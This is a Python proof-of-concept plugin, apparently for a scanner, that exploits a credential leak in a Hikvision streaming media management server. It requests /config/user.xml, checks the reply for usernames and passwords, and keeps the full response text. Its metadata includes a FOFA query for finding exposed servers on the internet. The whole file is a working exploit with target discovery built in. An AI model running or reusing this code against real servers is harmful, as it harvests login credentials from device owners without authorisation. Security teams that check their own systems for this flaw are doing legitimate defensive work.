#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'HIKVISION 流媒体管理服务器 user.xml 账号密码泄漏',

      'level'     :   'critical',

      'FOFA'      :   '"杭州海康威视系统技术有限公司 版权所有" && title="流媒体管理服务器"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/2/26',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/config/user.xml'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'<user name=.*?password=',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret